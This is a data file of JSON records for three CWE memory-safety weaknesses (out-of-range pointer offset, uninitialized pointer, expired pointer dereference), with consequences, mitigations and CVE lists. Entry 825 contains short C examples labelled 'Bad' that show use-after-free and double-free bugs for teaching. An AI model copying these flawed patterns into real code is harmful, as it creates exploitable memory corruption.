{"ID": "823", "Name": "Use of Out-of-range Pointer Offset", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs pointer arithmetic on a valid pointer, but it uses an offset that can point outside of the intended range of valid memory locations for the resulting pointer.", "ExtendedDescription": "\n\nWhile a pointer can contain a reference to any arbitrary memory location, a program typically only intends to use the pointer to access limited portions of memory, such as contiguous memory used to access an individual array.\n\n\nPrograms may use offsets in order to access fields or sub-elements stored within structured data. The offset might be out-of-range if it comes from an untrusted source, is the result of an incorrect calculation, or occurs because of another error.\n\n\nIf an attacker can control or influence the offset so that it points outside of the intended boundaries of the structure, then the attacker may be able to read or write to memory locations that are used elsewhere in the product. As a result, the attack might change the state of the product as accessed through program variables, cause a crash or instable behavior, and possibly lead to code execution.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "119", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "119", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "119", "ViewID": "1340", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "125", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "787", "ViewID": "1000"}], "AlternateTerms": [{"Term": "Untrusted pointer offset", "Description": "This term is narrower than the concept of \"out-of-range\" offset, since the offset might be the result of a calculation or other error that does not depend on any externally-supplied values."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Memory"], "Note": "If the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory."}, {"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "If the untrusted pointer references a memory location that is not accessible to the program, or points to a location that is \"malformed\" or larger than expected by a read or write operation, the application may terminate unexpectedly."}, {"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands", "Modify Memory"], "Note": "If the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "ObservedExamples": [{"Reference": "CVE-2010-2160", "Description": "Invalid offset in undocumented opcode leads to memory corruption.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2160"}, {"Reference": "CVE-2010-1281", "Description": "Multimedia player uses untrusted value from a file when using file-pointer calculations.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1281"}, {"Reference": "CVE-2009-3129", "Description": "Spreadsheet program processes a record with an invalid size field, which is later used as an offset.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3129"}, {"Reference": "CVE-2009-2694", "Description": "Instant messaging library does not validate an offset value specified in a packet.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2694"}, {"Reference": "CVE-2009-2687", "Description": "Language interpreter does not properly handle invalid offsets in JPEG image, leading to out-of-bounds memory access and crash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2687"}, {"Reference": "CVE-2009-0690", "Description": "negative offset leads to out-of-bounds read", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0690"}, {"Reference": "CVE-2008-4114", "Description": "untrusted offset in kernel", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4114"}, {"Reference": "CVE-2010-2873", "Description": "\"blind trust\" of an offset value while writing heap memory allows corruption of function pointer,leading to code execution", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2873"}, {"Reference": "CVE-2010-2866", "Description": "negative value (signed) causes pointer miscalculation", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2866"}, {"Reference": "CVE-2010-2872", "Description": "signed values cause incorrect pointer calculation", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2872"}, {"Reference": "CVE-2007-5657", "Description": "values used as pointer offsets", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5657"}, {"Reference": "CVE-2010-2867", "Description": "a return value from a function is sign-extended if the value is signed, then used as an offset for pointer arithmetic", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2867"}, {"Reference": "CVE-2009-1097", "Description": "portions of a GIF image used as offsets, causing corruption of an object pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1097"}, {"Reference": "CVE-2008-1807", "Description": "invalid numeric field leads to a free of arbitrary memory locations, then code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1807"}, {"Reference": "CVE-2007-2500", "Description": "large number of elements leads to a free of an arbitrary address", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2500"}, {"Reference": "CVE-2008-1686", "Description": "array index issue (CWE-129) with negative offset, used to dereference a function pointer", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1686"}, {"Reference": "CVE-2010-2878", "Description": "\"buffer seek\" value - basically an offset?", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2878"}], "RelatedAttackPatterns": ["129"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains."}, {"Type": "Terminology", "Note": "Many weaknesses related to pointer dereferences fall under the general term of \"memory corruption\" or \"memory safety.\" As of September 2010, there is no commonly-used terminology that covers the lower-level variants."}], "Top25Examples": [{"Reference": "CVE-2021-35098", "Description": "Improper validation of session id in PCM routing process can lead to memory corruption in Snapdragon Auto, Snapdragon Compute, Snapdragon Connectivity, Snapdragon Consumer IOT, Snapdragon Industrial IOT, Snapdragon Mobile, Snapdragon Voice & Music, Snapdragon Wearables"}, {"Reference": "CVE-2021-35132", "Description": "Out of bound write in DSP service due to improper bound check for response buffer size in Snapdragon Auto, Snapdragon Compute, Snapdragon Connectivity, Snapdragon Consumer IOT, Snapdragon Industrial IOT, Snapdragon Mobile, Snapdragon Wearables"}, {"Reference": "CVE-2022-22104", "Description": "Memory corruption in multimedia due to improper check on the messages received. in Snapdragon Auto"}, {"Reference": "CVE-2022-25682", "Description": "Memory corruption in MODEM UIM due to usage of out of range pointer offset while decoding command from card in Snapdragon Auto, Snapdragon Compute, Snapdragon Connectivity, Snapdragon Consumer IOT, Snapdragon Industrial IOT, Snapdragon Mobile, Snapdragon Voice & Music, Snapdragon Wearables"}, {"Reference": "CVE-2022-25694", "Description": "Memory corruption in Modem due to usage of Out-of-range pointer offset in UIM"}, {"Reference": "CVE-2022-25709", "Description": "Memory corruption in modem due to use of out of range pointer offset while processing qmi msg"}, {"Reference": "CVE-2022-25727", "Description": "Memory Corruption in modem due to improper length check while copying into memory in Snapdragon Consumer IOT, Snapdragon Industrial IOT, Snapdragon Voice & Music"}, {"Reference": "CVE-2022-33210", "Description": "Memory corruption in automotive multimedia due to use of out-of-range pointer offset while parsing command request packet with a very large type value. in Snapdragon Auto"}, {"Reference": "CVE-2021-33742", "Description": "Windows MSHTML Platform Remote Code Execution Vulnerability"}, {"Reference": "CVE-2022-0614", "Description": "Use of Out-of-range Pointer Offset in Homebrew mruby prior to 3.2."}, {"Reference": "CVE-2022-33246", "Description": "Memory corruption in Audio due to use of out-of-range pointer offset while Initiating a voice call session from user space with invalid session id."}, {"Reference": "CVE-2022-42264", "Description": "NVIDIA GPU Display Driver for Linux contains a vulnerability in the kernel mode layer, where an unprivileged regular user can cause the use of an out-of-range pointer offset, which may lead to data tampering, data loss, information disclosure, or denial of service."}]}
{"ID": "824", "Name": "Access of Uninitialized Pointer", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accesses or uses a pointer that has not been initialized.", "ExtendedDescription": "\n\nIf the pointer contains an uninitialized value, then the value might not point to a valid memory location. This could cause the product to read from or write to unexpected memory locations, leading to a denial of service. If the uninitialized pointer is used as a function call, then arbitrary functions could be invoked. If an attacker can influence the portion of uninitialized memory that is contained in the pointer, this weakness could be leveraged to execute code or perform other attacks.\n\n\nDepending on memory layout, associated memory management behaviors, and product operation, the attacker might be able to influence the contents of the uninitialized pointer, thus gaining more fine-grained control of the memory location to be accessed.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "119", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "119", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "119", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "119", "ViewID": "1340", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "125", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "787", "ViewID": "1000"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Memory"], "Note": "If the uninitialized pointer is used in a read operation, an attacker might be able to read sensitive portions of memory."}, {"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "If the uninitialized pointer references a memory location that is not accessible to the product, or points to a location that is \"malformed\" (such as NULL) or larger than expected by a read or write operation, then a crash may occur."}, {"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "If the uninitialized pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "ObservedExamples": [{"Reference": "CVE-2024-32878", "Description": "LLM product has a free of an uninitialized pointer", "Link": "https://www.cve.org/CVERecord?id=CVE-2024-32878"}, {"Reference": "CVE-2010-0211", "Description": "chain: unchecked return value (CWE-252) leads to free of invalid, uninitialized pointer (CWE-824).", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0211"}, {"Reference": "CVE-2009-2768", "Description": "Pointer in structure is not initialized, leading to NULL pointer dereference (CWE-476) and system crash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2768"}, {"Reference": "CVE-2009-1721", "Description": "Free of an uninitialized pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1721"}, {"Reference": "CVE-2009-1415", "Description": "Improper handling of invalid signatures leads to free of invalid pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1415"}, {"Reference": "CVE-2009-0846", "Description": "Invalid encoding triggers free of uninitialized pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0846"}, {"Reference": "CVE-2009-0040", "Description": "Crafted PNG image leads to free of uninitialized pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0040"}, {"Reference": "CVE-2008-2934", "Description": "Crafted GIF image leads to free of uninitialized pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2934"}, {"Reference": "CVE-2007-4682", "Description": "Access of uninitialized pointer might lead to code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4682"}, {"Reference": "CVE-2007-4639", "Description": "Step-based manipulation: invocation of debugging function before the primary initialization function leads to access of an uninitialized pointer and code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4639"}, {"Reference": "CVE-2007-4000", "Description": "Unchecked return values can lead to a write to an uninitialized pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4000"}, {"Reference": "CVE-2007-2442", "Description": "zero-length input leads to free of uninitialized pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2442"}, {"Reference": "CVE-2007-1213", "Description": "Crafted font leads to uninitialized function pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1213"}, {"Reference": "CVE-2006-6143", "Description": "Uninitialized function pointer in freed memory is invoked", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6143"}, {"Reference": "CVE-2006-4175", "Description": "LDAP server mishandles malformed BER queries, leading to free of uninitialized memory", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4175"}, {"Reference": "CVE-2006-0054", "Description": "Firewall can crash with certain ICMP packets that trigger access of an uninitialized pointer.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-0054"}, {"Reference": "CVE-2003-1201", "Description": "LDAP server does not initialize members of structs, which leads to free of uninitialized pointer if an LDAP request fails.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1201"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains."}, {"Type": "Terminology", "Note": "Many weaknesses related to pointer dereferences fall under the general term of \"memory corruption\" or \"memory safety.\" As of September 2010, there is no commonly-used terminology that covers the lower-level variants."}], "Top25Examples": [{"Reference": "CVE-2022-28690", "Description": "The affected product is vulnerable to an out-of-bounds write via uninitialized pointer, which may allow an attacker to execute arbitrary code."}, {"Reference": "CVE-2022-29488", "Description": "The affected product is vulnerable to an out-of-bounds read via uninitialized pointer, which may allow an attacker to execute arbitrary code."}, {"Reference": "CVE-2022-29925", "Description": "Access of uninitialized pointer vulnerability exists in the simulator module contained in the graphic editor 'V-SFT' versions prior to v6.1.6.0, which may allow an attacker to obtain information and/or execute arbitrary code by having a user to open a specially crafted image file."}, {"Reference": "CVE-2022-30540", "Description": "The affected product is vulnerable to a heap-based buffer overflow via uninitialized pointer, which may allow an attacker to execute arbitrary code"}, {"Reference": "CVE-2022-33280", "Description": "Memory corruption due to access of uninitialized pointer in Bluetooth HOST while processing the AVRCP packet."}, {"Reference": "CVE-2022-3377", "Description": "Horner Automation's Cscape version 9.90 SP 6 and prior does not properly validate user-supplied data. If a user opens a maliciously formed FNT file, then an attacker could execute arbitrary code within the current process by accessing an uninitialized pointer, leading to an out-of-bounds memory read. "}, {"Reference": "CVE-2022-3378", "Description": " Horner Automation's Cscape version 9.90 SP 7 and prior does not properly validate user-supplied data. If a user opens a maliciously formed FNT file, then an attacker could execute arbitrary code within the current process by accessing an uninitialized pointer, leading to an out-of-bounds memory write. "}, {"Reference": "CVE-2022-43606", "Description": "A use-of-uninitialized-pointer vulnerability exists in the Forward Open connection_management_entry functionality of EIP Stack Group OpENer development commit 58ee13c. A specially-crafted EtherNet/IP request can lead to use of a null pointer, causing the server to crash. An attacker can send a series of EtherNet/IP requests to trigger this vulnerability."}, {"Reference": "CVE-2022-21971", "Description": "Windows Runtime Remote Code Execution Vulnerability"}]}
{"ID": "825", "Name": "Expired Pointer Dereference", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product dereferences a pointer that contains a location for memory that was previously valid, but is no longer valid.", "ExtendedDescription": "When a product releases memory, but it maintains a pointer to that memory, then the memory might be re-allocated at a later time. If the original pointer is accessed to read or write data, then this could cause the product to read or modify data that is in use by a different function or process. Depending on how the newly-allocated memory is used, this could lead to a denial of service, information exposure, or code execution.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "119", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "119", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "119", "ViewID": "1340", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "672", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "125", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "787", "ViewID": "1000"}], "AlternateTerms": [{"Term": "Dangling pointer"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Memory"], "Note": "If the expired pointer is used in a read operation, an attacker might be able to control data read in by the application."}, {"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "If the expired pointer references a memory location that is not accessible to the product, or points to a location that is \"malformed\" (such as NULL) or larger than expected by a read or write operation, then a crash may occur."}, {"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "If the expired pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible."}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Choose a language that provides automatic memory management."}, {"Phase": ["Implementation"], "Description": "When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy."}], "DemonstrativeExamples": [{"ID": "DX-71", "Entries": [{"IntroText": "The following code shows a simple example of a use after free error:"}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar* ptr = (char*)malloc (SIZE);\n\tif (err) {\n\t\tabrt = 1;\n\t\tfree(ptr);\n\t}\n\t...\n\tif (abrt) {\n\t\tlogError(\"operation aborted before commit\", ptr);\n\t}\n```"}, {"BodyText": "When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function."}]}, {"ID": "DX-72", "Entries": [{"IntroText": "The following code shows a simple example of a double free error:"}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar* ptr = (char*)malloc (SIZE);\n\t...\n\tif (abrt) {\n\t\tfree(ptr);\n\t}\n\t...\n\tfree(ptr);\n```"}, {"BodyText": "Double free vulnerabilities have two common (and sometimes overlapping) causes:"}, {"BodyText": "- Error conditions and other exceptional circumstances\n\n  - Confusion over which part of the program is responsible for freeing the memory"}, {"BodyText": "Although some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once."}]}], "ObservedExamples": [{"Reference": "CVE-2008-5013", "Description": "access of expired memory address leads to arbitrary code execution", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5013"}, {"Reference": "CVE-2010-3257", "Description": "stale pointer issue leads to denial of service and possibly other consequences", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3257"}, {"Reference": "CVE-2008-0062", "Description": "Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0062"}, {"Reference": "CVE-2007-1211", "Description": "read of value at an offset into a structure after the offset is no longer valid", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1211"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains."}, {"Type": "Terminology", "Note": "Many weaknesses related to pointer dereferences fall under the general term of \"memory corruption\" or \"memory safety.\" As of September 2010, there is no commonly-used terminology that covers the lower-level variants."}], "Top25Examples": [{"Reference": "CVE-2022-39803", "Description": "Due to lack of proper memory management, when a victim opens a manipulated ACIS Part and Assembly (.sat, CoreCadTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-39804", "Description": "Due to lack of proper memory management, when a victim opens a manipulated SolidWorks Part (.sldprt, CoreCadTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-39805", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Computer Graphics Metafile (.cgm, CgmTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-39806", "Description": "Due to lack of proper memory management, when a victim opens a manipulated SolidWorks Drawing (.slddrw, CoreCadTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-39808", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Wavefront Object (.obj, ObjTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41167", "Description": "Due to lack of proper memory management, when a victim opens a manipulated AutoCAD (.dwg, TeighaTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41168", "Description": "Due to lack of proper memory management, when a victim opens a manipulated CATIA5 Part (.catpart, CatiaTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41170", "Description": "Due to lack of proper memory management, when a victim opens a manipulated CATIA4 Part (.model, CatiaTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41172", "Description": "Due to lack of proper memory management, when a victim opens a manipulated AutoCAD (.dxf, TeighaTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41175", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Enhanced Metafile (.emf, emf.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41177", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Iges Part and Assembly (.igs, .iges, CoreCadTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41179", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Jupiter Tesselation (.jt, JtTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41180", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Portable Document Format (.pdf, PDFPublishing.dll) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41184", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Windows Cursor File (.cur, ico.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41185", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Visual Design Stream (.vds, MataiPersistence.dll) file received from untrusted sources in SAP 3D Visual Enterprise Author - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41186", "Description": "Due to lack of proper memory management, when a victim opens manipulated Computer Graphics Metafile (.cgm, CgmCore.dll) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, a Remote Code Execution can be triggered when payload forces a stack-based overflow and or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41187", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Wavefront Object (.obj, ObjTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41189", "Description": "Due to lack of proper memory management, when a victim opens a manipulated AutoCAD (.dwg, TeighaTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41190", "Description": "Due to lack of proper memory management, when a victim opens a manipulated AutoCAD (.dxf, TeighaTranslator.exe) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41191", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Jupiter Tesselation (.jt, JTReader.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41193", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Encapsulated Post Script (.eps, ai.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41195", "Description": "Due to lack of proper memory management, when a victim opens a manipulated EAAmiga Interchange File Format (.iff, 2d.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41196", "Description": "Due to lack of proper memory management, when a victim opens a manipulated VRML Worlds (.wrl, vrml.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41198", "Description": "Due to lack of proper memory management, when a victim opens a manipulated SketchUp (.skp, SketchUp.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41199", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Open Inventor File (.iv, vrml.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41200", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Scalable Vector Graphic (.svg, svg.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41201", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Right Hemisphere Binary (.rh, rh.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41202", "Description": "Due to lack of proper memory management, when a victim opens a manipulated Visual Design Stream (.vds, vds.x3d) file received from untrusted sources in SAP 3D Visual Enterprise Viewer - version 9, it is possible that a Remote Code Execution can be triggered when payload forces a stack-based overflow or a re-use of dangling pointer which refers to overwritten space in memory. "}, {"Reference": "CVE-2022-41211", "Description": "Due to lack of proper memory management, when a victim opens manipulated file received from untrusted sources in SAP 3D Visual Enterprise Author and SAP 3D Visual Enterprise Viewer, Arbitrary Code Execution can be triggered when payload forces:Re-use of dangling pointer which refers to overwritten space in memory. The accessed memory must be filled with code to execute the attack. Therefore, repeated success is unlikely.Stack-based buffer overflow. Since the memory overwritten is random, based on access rights of the memory, repeated success is not assured. "}, {"Reference": "CVE-2021-39693", "Description": "In onUidStateChanged of AppOpsService.java, there is a possible way to access location without a visible indicator due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12Android ID: A-208662370"}]}
